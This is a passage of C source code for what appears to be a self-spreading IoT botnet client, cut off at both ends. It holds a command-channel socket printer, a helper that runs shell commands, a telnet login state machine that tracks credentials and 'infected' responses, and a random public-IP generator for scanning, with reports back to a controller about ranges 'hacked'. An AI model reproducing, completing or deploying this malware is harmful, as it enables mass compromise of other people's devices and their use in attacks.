78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,79,79,79,79,80,80,80,80,82,82,82,82,82,82,82,82,83,83,83,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,87,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,89,89,91,93,93,93,93,93,93,94,94,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95};
int rangesC2[] = {10,70,108,193,195,195,198,198,198,203,203,203,206,214,214,220,242,242,242,30,30,30,35,35,43,49,55,62,62,62,197,86,69,169,160,173,173,173,173,173,35,237,137,178,178,53,54,107,119,107,132,24,0,72,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,160,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,162,167,167,167,168,168,168,174,174,174,174,174,174,174,175,175,175,175,175,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,185,185,185,185,185,185,185,185,185,185,185,185,191,191,191,191,191,201,27,142,255,201,201,121,96,136,184,180,226,52,52,68,71,71,75,75,75,112,114,117,177,227,236,251,67,67,67,243,243,243,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,149,169,55,43,44,44,44,44,44,44,44,44,44,62,109,150,213,216,229,103,103,103,103,103,156,156,156,156,156,156,156,156,156,156,156,156,156,250,51,93,93,0,0,0,1,135,163,163,163,23,23,23,23,23,23,23,23,23,23,42,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,1,1,143,158,158,158,158,143,65,82,82,230,230,230,230,239,239,239,239,245,245,245,245,245,245,245,245,245,245,245,245,245,245,245,245,252,252,252,252,252,115,115,120,120,121,121,121,127,127,252,252,252,252,39,42,42,42,42,48,48,48,48,48,48,48,48,63,63,63,63,144,144,144,144,144,144,145,145,145,145,105,137,141,141,141,141,141,141,141,203,233,120,95,95,95,177,7,7,7,7,85,176,108,108,209,35,35,35,35,94,94,139,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,126,126,126,126,250,250,250,82,52,52,53,53,53,55,55,71,12,221,24,104,104,104,104,104,104,104,104,104,104,104,104,104,104,104,104,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,109,109,109,109,173,173,173,173,173,173,173,173,173,95,95,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,99,117,147,147,147,147,147,204,225,225,225,225,225,225,225,225,225,225,234,234,234,234,234,234,234,234,234,234,234,234,234,234,234,234,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,247,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,248,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,249,251,3,200,248,140,100,100,100,100,103,190,29,70,152,152,152,152,152,210,37,37,37,37,37,37,37,46,46,53,53,53,69,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9,9};
int rangesC3[] = {245,80,29,117,198,199,28,29,30,184,185,187,250,64,67,220,60,61,63,252,253,254,54,81,6,253,170,147,41,43,218,220,80,211,89,100,101,103,96,97,197,157,49,80,84,242,111,193,192,105,66,171,62,45,1,10,12,14,2,25,3,32,34,35,4,46,51,56,60,61,63,69,78,8,80,86,89,9,0,120,121,122,13,130,131,139,14,140,141,15,16,164,2,20,22,224,225,226,228,231,232,233,234,235,236,237,238,28,29,31,5,6,72,75,76,77,82,9,34,35,52,144,166,242,104,105,106,107,108,109,111,170,171,224,225,226,1,100,101,102,103,104,105,106,107,108,109,11,110,112,113,115,116,118,120,121,122,125,126,127,128,13,142,143,16,168,169,17,171,172,173,176,178,179,18,19,20,21,24,244,247,25,26,27,28,29,30,31,32,34,35,37,60,66,8,96,97,98,99,201,202,203,204,205,206,207,232,32,33,36,38,16,17,19,22,23,82,155,130,184,237,48,7,193,233,162,46,141,109,84,221,119,144,104,191,213,228,185,242,188,26,36,227,131,204,217,130,155,215,100,107,123,127,149,161,171,191,214,34,37,38,59,74,9,122,53,133,51,32,227,232,233,234,235,249,253,254,92,110,131,58,25,146,112,114,120,121,124,172,173,204,206,208,209,210,212,216,217,218,219,223,64,166,253,98,170,177,67,133,117,2,21,61,11,151,161,186,188,212,214,240,28,73,69,126,127,128,131,136,154,158,168,186,249,34,35,76,78,86,90,95,130,53,90,103,210,236,69,2,160,128,138,172,173,174,175,68,69,70,71,136,137,138,139,148,149,150,151,156,157,158,159,208,209,210,211,25,30,31,33,35,140,143,56,58,188,190,191,41,43,180,181,182,183,196,27,29,42,59,144,155,156,158,189,195,203,208,0,131,198,232,152,207,223,248,28,98,109,149,52,57,43,156,145,179,184,33,37,67,92,78,203,240,2,207,62,237,173,178,187,190,161,4,211,219,2,146,18,216,8,105,106,215,10,110,111,114,116,117,12,120,124,128,129,130,133,136,141,143,144,150,151,153,159,16,160,163,169,17,170,173,174,177,178,179,18,181,182,184,187,189,191,194,196,197,198,2,20,200,203,204,206,207,209,210,22,24,243,244,245,246,247,248,25,251,252,254,26,32,34,35,36,37,38,39,4,45,47,5,50,51,52,55,56,58,60,62,63,65,66,69,9,98,10,100,102,103,106,112,128,131,135,137,139,141,15,150,152,167,17,171,174,175,176,177,178,179,18,182,187,188,189,193,194,195,197,2,20,213,214,215,217,218,223,225,226,227,228,23,230,233,237,239,28,29,3,31,33,34,35,37,38,4,41,45,46,47,49,50,52,54,55,59,6,62,66,7,70,71,76,8,81,83,84,87,89,9,91,99,106,108,11,110,115,116,117,12,126,127,128,13,150,152,154,158,159,16,160,162,164,165,167,168,170,172,174,175,184,185,19,191,192,193,194,200,202,203,204,208,21,213,214,216,223,225,227,231,237,239,27,28,30,33,45,46,47,48,51,54,59,61,74,76,77,78,81,84,86,87,95,17,37,74,85,155,157,5,88,52,82,11,15,79,214,240,116,96,3,3,100,106,109,110,113,115,139,172,185,2,211,224,231,38,48,67,1,100,101,103,105,106,108,116,12,121,122,123,128,13,131,135,137,139,14,140,141,144,146,148,150,151,153,154,155,157,158,159,16,163,168,169,17,172,175,177,178,179,18,181,182,185,187,188,189,19,191,193,195,196,199,20,200,203,211,212,214,217,220,222,224,226,229,230,231,233,234,236,237,238,243,245,249,25,254,27,32,34,36,37,39,4,41,43,44,46,49,50,52,53,54,57,59,63,64,65,69,75,76,77,78,79,8,80,81,83,84,85,89,90,93,94,95,98,99,117,31,7,96,108,145,159,187,195,196,242,247,71,160,199,0,100,106,107,11,110,111,112,113,115,116,117,119,132,133,136,14,153,158,16,163,2,206,218,22,223,226,228,234,243,244,246,247,248,249,251,254,26,6,73,98,99,186,183,213,215,228,237,75,209,210,215,225,226,227,229,230,234,242,112,156,158,182,186,189,195,2,211,219,223,27,63,71,90,94,10,100,101,102,105,107,11,110,112,115,116,118,120,122,125,126,130,132,133,134,138,144,147,148,152,160,161,162,166,167,169,179,182,184,185,191,195,20,205,207,208,209,210,212,215,218,219,22,220,222,223,226,227,23,236,24,243,245,27,29,34,37,39,4,41,43,45,5,50,51,55,56,58,59,61,62,64,65,67,69,7,71,76,77,8,85,87,9,93,96,98,10,100,102,110,112,113,114,117,118,122,13,130,133,134,137,138,140,160,162,163,164,165,166,168,17,170,173,179,18,180,184,19,2,247,249,252,29,3,49,50,52,54,6,7,85,92,96,97,98,0,10,104,105,106,107,114,117,127,14,163,166,168,174,177,181,182,183,185,200,206,208,214,220,222,224,226,232,233,24,244,246,248,253,28,29,3,30,31,37,38,4,40,44,45,48,50,52,53,55,56,58,59,60,61,62,63,64,68,7,70,8,84,89,99,160,149,234,126,130,148,156,212,224,247,253,157,244,13,15,32,57,9,44,123,151,165,231,50,70,9,168,169,139,237,239,31,10,101,102,104,108,109,112,117,120,121,123,124,126,128,129,133,136,137,138,139,140,144,145,156,157,158,159,161,167,168,172,174,176,178,179,181,182,185,190,191,192,198,200,207,227,233,239,242,244,245,248,250,253,28,34,36,37,38,39,45,52,57,6,62,65,67,70,74,76,78,79,80,81,86,95};



#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
int dupppp = 0;
int rangechoice = 1;
int versionnnn = 2;
int subversionnnn = 1;

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}

int zprintf(const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}


int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
        register int iop;
        int pdes[2], fds, pid;

        if (*type != 'r' && *type != 'w' || type[1]) return -1;

        if (pipe(pdes) < 0) return -1;
        if (fdopen_pids == NULL) {
                if ((fds = getdtablesize()) <= 0) return -1;
                if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
                memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
        }

        switch (pid = vfork())
        {
        case -1:
                close(pdes[0]);
                close(pdes[1]);
                return -1;
        case 0:
                if (*type == 'r') {
                        if (pdes[1] != 1) {
                                dup2(pdes[1], 1);
                                close(pdes[1]);
                        }
                        close(pdes[0]);
                } else {
                        if (pdes[0] != 0) {
                                (void) dup2(pdes[0], 0);
                                (void) close(pdes[0]);
                        }
                        (void) close(pdes[1]);
                }
                execl("/bin/sh", "sh", "-c", program, NULL);
                _exit(127);
        }
        if (*type == 'r') {
                iop = pdes[0];
                (void) close(pdes[1]);
        } else {
                iop = pdes[1];
                (void) close(pdes[0]);
        }
        fdopen_pids[iop] = pid;
        return (iop);
}

int fdpclose(int iop)
{
        register int fdes;
        sigset_t omask, nmask;
        int pstat;
        register int pid;

        if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
        (void) close(iop);
        sigemptyset(&nmask);
        sigaddset(&nmask, SIGINT);
        sigaddset(&nmask, SIGQUIT);
        sigaddset(&nmask, SIGHUP);
        (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
        do {
                pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
        } while (pid == -1 && errno == EINTR);
        (void) sigprocmask(SIG_SETMASK, &omask, NULL);
        fdopen_pids[fdes] = 0;
        return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}

static const long hextable[] = {
        [0 ... 255] = -1,
        ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
        ['A'] = 10, 11, 12, 13, 14, 15,
        ['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char *hex)
{
        long ret = 0;
        while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
        return ret;
}

int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern)
        {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void uppercase(unsigned char *str)
{
        while(*str) { *str = toupper(*str); str++; }
}

int getBogos(unsigned char *bogomips)
{
        int cmdline = open("/proc/cpuinfo", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                uppercase(linebuf);
                if(strstr(linebuf, "BOGOMIPS") == linebuf)
                {
                        unsigned char *pos = linebuf + 8;
                        while(*pos == ' ' || *pos == '\t' || *pos == ':') pos++;
                        while(pos[strlen(pos)-1] == '\r' || pos[strlen(pos)-1] == '\n') pos[strlen(pos)-1]=0;
                        if(strchr(pos, '.') != NULL) *strchr(pos, '.') = 0x00;
                        strcpy(bogomips, pos);
                        close(cmdline);
                        return 0;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);
        return 1;
}

int getCores()
{
        int totalcores = 0;
        int cmdline = open("/proc/cpuinfo", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                uppercase(linebuf);
                if(strstr(linebuf, "BOGOMIPS") == linebuf) totalcores++;
                memset(linebuf, 0, 4096);
        }
        close(cmdline);
        return totalcores;

}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);

        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        sockprintf(mainCommSock, "PING");

                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }

                        break;
                }
        }

        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;

        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;

//      zprintf("recv: %s\n", cp);

        return count;
}






















struct telstate_t
{
        int fd;
        unsigned int ip;
        unsigned char state;
        unsigned char complete;
        unsigned char usernameInd;
        unsigned char passwordInd;
        unsigned char tempDirInd;
        unsigned int totalTimeout;
        unsigned short bufUsed;
        char *sockbuf;
};
const char* get_telstate_host(struct telstate_t* telstate)
{
        struct in_addr in_addr_ip; 
        in_addr_ip.s_addr = telstate->ip;
        return inet_ntoa(in_addr_ip);
}

int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings)
{
        int num_bytes, i;
        memset(buffer, 0, buf_size);
        num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);

        if(buffer[0] == 0xFF)
        {
                negotiate(fd, buffer, 3);
        }

        if(contains_string(buffer, strings))
        {
                return 1;
        }

        return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size)
{       
        fd_set read_set;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = timeout_usec;

        FD_ZERO(&read_set);
        FD_SET(fd, &read_set);

        if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
                return 0;

        return recv(fd, buffer, buf_size, 0);
}
void advance_state(struct telstate_t* telstate, int new_state)
{
        if(new_state == 0)
        {
                close(telstate->fd);
        }

        telstate->totalTimeout = 0;
        telstate->state = new_state;
        memset((telstate->sockbuf), 0, BUFFER_SIZE);
}

void reset_telstate(struct telstate_t* telstate)
{
        advance_state(telstate, 0);
        telstate->complete = 1;
}
int contains_success(char* buffer)
{
        return contains_string(buffer, successes);
}
int contains_fail(char* buffer)
{
        return contains_string(buffer, fails);
}

int contains_response(char* buffer)
{
        return contains_success(buffer) || contains_fail(buffer);
}
int contains_string(char* buffer, char** strings)
{
        int num_strings = 0, i = 0;

        for(num_strings = 0; strings[++num_strings] != 0; );

        for(i = 0; i < num_strings; i++)
        {
                if(strcasestr(buffer, strings[i]))
                {
                        return 1;
                }
        }

        return 0;
}


int contains_infectmessage(char* buffer)
{
	return contains_string(buffer, infected);
}














int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

int negotiate(int sock, unsigned char *buf, int len)
{
        unsigned char c;

        switch (buf[1]) {
        case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;

        default:
                break;
        }

        return 0;
}

int matchPrompt(char *bufStr)
{
        char *prompts = ":>%$#\0";

        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++)
        {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }

        return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
        int bufferUsed = initialIndex, got = 0, found = 0;
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = timeout;
        tv.tv_usec = timeoutusec;
        unsigned char *initialRead = NULL;

        while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
        {
                FD_ZERO(&myset);
                FD_SET(fd, &myset);
                if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
                initialRead = buffer + bufferUsed;
                got = recv(fd, initialRead, 1, 0);
                if(got == -1 || got == 0) return 0;
                bufferUsed += got;
                if(*initialRead == 0xFF)
                {
                        got = recv(fd, initialRead + 1, 2, 0);
                        if(got == -1 || got == 0) return 0;
                        bufferUsed += got;
                        if(!negotiate(fd, initialRead, 3)) return 0;
                } else {
                        if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
                }
        }

        if(found) return 1;
        return 0;
}

void sendstatsforbrange(int a, int b){
	
	sockprintf(mainCommSock, "i gave this range the D %d.%d|%d", a, b, hacked);
	hacked = 0;
	
}


static uint8_t ipState[5] = {0};
in_addr_t getRandomPublicIP3()
 {
	 if(ipState[1] > 0 && ipState[4] < 255)
	 {
		 ipState[4]++;
		 char ip[16] = {0};
		 szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
		 return inet_addr(ip);
	 }
 
	 ipState[1] = rand() % 255;
	 ipState[2] = rand() % 255;
	 ipState[3] = rand() % 255;
	 ipState[4] = 0;
	 while(
		 (ipState[1] == 0) ||
		 (ipState[1] == 10) ||
		 (ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 127)) ||
		 (ipState[1] == 127) ||
		 (ipState[1] == 169 && ipState[2] == 254) ||
		 (ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) ||
		 (ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) ||
		 (ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) ||
		 (ipState[1] == 192 && ipState[2] == 168) ||
		 (ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) ||
		 (ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) ||
		 (ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) ||
		 (ipState[1] >= 224)
	 )
	 {
		 ipState[1] = rand() % 255;
		 ipState[2] = rand() % 255;
		 ipState[3] = rand() % 255;
	 }
 
	 char ip[16] = {0};
	 szprintf(ip, "%d.%d.%d.0", ipState[1], ipState[2], ipState[3]);
